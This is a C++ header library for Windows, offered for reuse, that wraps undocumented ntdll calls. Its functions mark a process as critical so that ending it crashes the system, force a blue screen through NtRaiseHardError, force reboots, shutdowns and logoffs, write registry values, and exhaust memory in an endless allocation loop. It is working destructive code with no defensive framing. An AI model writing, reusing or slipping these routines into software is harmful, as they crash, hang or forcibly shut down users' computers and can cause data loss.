/*
	WinInternal.h v1.0
	License: Unlicense
	Author: MathInDOS (Sofia)
	Date: 20 March 2021
	
	Compilation
	-----------
	
	g++ <your file> -o <output> -lntdll
	
	Example: g++ test.cpp -o test.exe -lntdll
*/

#ifndef _H_WININTERNAL_
#define _H_WININTERNAL_
#ifdef __GNUC__
#include <iostream>
#include <windows.h>
#include <Tlhelp32.h>
#include <Process.h>
#endif
#ifdef _MSV_VER
#error "MSVC Compiler isn't supported yet."
#endif


/*
Undocumented API's
*/

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorNT, ULONG Parameters, ULONG UnicodeStr, PLONG_PTR NewPtr, ULONG ValidRes, PULONG Response);


namespace WININTRNL
{
    class INTERNAL
    {
        private:
        BOOLEAN bl;
        ULONG ulong;
        NTSTATUS ntstatus;
		HANDLE handle;
		TOKEN_PRIVILEGES tkp;

        public:
		
		/* Set current process as critical process */
        void CriticalProcess(void)
        {
            RtlAdjustPrivilege(20, true, false, &bl);

            while(true)
            {
                ulong = 1;
                ntstatus = NtSetInformationProcess((HANDLE)-1, 0x1d, &ulong, sizeof(ULONG));

                if (ntstatus != 0)
                {
                    std::cout << "Unable to mark process as critical process." << std::endl;
                } else {
                    // Hold on
                }
				
            }

        }
		
		/* NTDLL for BSOD */
		void ExecuteBSOD(void)
		{
			RtlAdjustPrivilege(19, true, false, &bl);

			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &ulong);
		}
		
		/* If BSOD fails to load force to reboot computer for take any effects. */
		void ExecuteBSODIfFail()
		{
			RtlAdjustPrivilege(19, true, false, &bl);

			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &ulong);

			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &handle)) exit(1);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			AdjustTokenPrivileges(handle, false, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 

			if (GetLastError() != ERROR_SUCCESS) exit(1);
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED);
		}
		
		/* Shutdown computer with signal */
		void Shutdown(void)
		{
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &handle)) exit(1);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			AdjustTokenPrivileges(handle, false, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 

			if (GetLastError() != ERROR_SUCCESS) exit(1);
			ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED);
		}
		
		/* Send a reboot signal to reboot computer */
		void Reboot(void)
		{
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &handle)) exit(1);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			AdjustTokenPrivileges(handle, false, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 

			if (GetLastError() != ERROR_SUCCESS) exit(1);
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED);
		}
		
		/* Poweroff whole system (not a complete shutdown) */
		void Poweroff(void)
		{
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &handle)) exit(1);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			AdjustTokenPrivileges(handle, false, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 

			if (GetLastError() != ERROR_SUCCESS) exit(1);
			ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED);
		}
		
		/* Logoff computer */
		void Logoff(void)
		{
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &handle)) exit(1);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			AdjustTokenPrivileges(handle, false, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 

			if (GetLastError() != ERROR_SUCCESS) exit(1);
			ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED);
		}
		
		/* Lock computer */
		void Lock(void)
		{
			LockWorkStation();
		}
		
		/* Create registry key and set data to it's key */
		void RegCreateSet(HKEY hKey, LPCTSTR KeyLocation, LPCTSTR keyname, int Type, LPCTSTR Data, int size)
		{
			HKEY key;
			RegCreateKeyEx(hKey, KeyLocation, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &key, NULL);
			
			if (RegOpenKeyEx(hKey, KeyLocation, 0, KEY_SET_VALUE | KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
			{
				RegSetValueEx(key, keyname, 0, Type, (LPBYTE)Data, size);
			} else {
				std::cout << "Unable to access registry." << std::endl;
			}
			
			RegCloseKey(key);
		}
		
		/* Create registry key and set dword data to it's key */
		void RegCreateSetdw(HKEY hKey, LPCTSTR KeyLocation, LPCTSTR keyname, DWORD Data)
		{
			HKEY key;
			DWORD num = 1;
		
			if (RegOpenKeyEx(hKey, KeyLocation, 0, KEY_SET_VALUE | KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
			{
				RegSetValueEx(key, keyname, 0, REG_DWORD, (LPBYTE)&Data, sizeof(DWORD));
		
			} else {
				std::cout << "Unable to access registry." << std::endl;
			}
			
			RegCloseKey(key);
		}
		
		/* Set value of a registry key */
		void RegSetVal(HKEY hKey, LPCTSTR KeyLocation, LPCTSTR keyname, LPCTSTR Data, int size)
		{		
			HKEY key;
	
			if (RegOpenKeyEx(hKey, KeyLocation, 0, KEY_SET_VALUE | KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
			{
				RegSetValueEx(key, keyname, 0, REG_SZ, (LPBYTE)Data, size);
		
			} else {
				std::cout << "Unable to access registry." << std::endl;
			}
			
			RegCloseKey(key);
		}
		
		/* Set registry dword value */
		void RegSetValdw(HKEY hKey, LPCTSTR KeyLocation, LPCTSTR keyname, DWORD Data)
		{
			HKEY key;
			DWORD num = 1;
		
			if (RegOpenKeyEx(hKey, KeyLocation, 0, KEY_SET_VALUE | KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
			{
				RegSetValueEx(key, keyname, 0, REG_DWORD, (LPBYTE)&Data, sizeof(DWORD));
		
			}
			RegCloseKey(key);
		}
		
		// FillupRAM with 4 bytes (int)
		void FillupRAM(void)
		{
			while(true)
			{
				int *a = new int;
				int *b = new int;
				// No more else it's sudden it hang and also it fillup amount of RAM in seconds.
			}
		}
	};
}

#endif

